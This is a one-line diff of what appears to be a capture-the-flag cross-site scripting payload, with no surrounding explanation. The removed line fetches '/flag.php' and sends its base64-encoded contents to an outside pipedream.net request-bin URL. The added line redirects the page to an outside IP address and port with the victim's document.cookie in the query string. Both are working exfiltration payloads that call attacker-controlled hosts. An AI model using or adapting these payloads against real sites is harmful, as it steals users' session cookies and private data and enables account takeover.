@@ -1,1 +1,1 @@
-fetch('/flag.php').then(x=>x.text()).then(x=>top.location.replace('https://encnu1395lyv7.x.pipedream.net/?'+btoa(x)))
+window.location='http://198.13.38.185:4000/?q='+document.cookie;
